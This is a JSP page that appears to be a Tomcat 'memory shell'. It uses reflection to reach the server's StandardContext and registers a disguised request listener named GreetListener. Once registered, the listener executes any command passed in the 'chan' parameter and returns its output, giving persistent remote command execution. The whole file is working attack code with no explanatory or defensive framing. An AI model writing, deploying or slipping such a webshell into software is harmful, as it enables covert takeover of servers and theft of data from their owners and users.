<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="javax.servlet.*" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>


<%
class GreetListener implements ServletRequestListener{
    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
        
    }
    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
		try{		
			if(request.getParameter("chan") != null){
				Process process = Runtime.getRuntime().exec(request.getParameter("chan"));
				java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
						new java.io.InputStreamReader(process.getInputStream()));
				StringBuilder stringBuilder = new StringBuilder();
				String line;
				while ((line = bufferedReader.readLine()) != null) {
					stringBuilder.append(line + '\n');
				}
				response.getOutputStream().write(stringBuilder.toString().getBytes());
				response.getOutputStream().flush();
				response.getOutputStream().close();
				return;
			}
		}catch(Exception ig){
			ig.printStackTrace();
		}
    }
}
%>

<%
	ServletContext servletContext =  request.getSession().getServletContext();

	Field appctx = servletContext.getClass().getDeclaredField("context");
	appctx.setAccessible(true);
	ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

	Field stdctx = applicationContext.getClass().getDeclaredField("context");
	stdctx.setAccessible(true);
	StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

	GreetListener servletRequestListener = new GreetListener();
	standardContext.addApplicationEventListener(servletRequestListener);
	out.println(">@<");
%>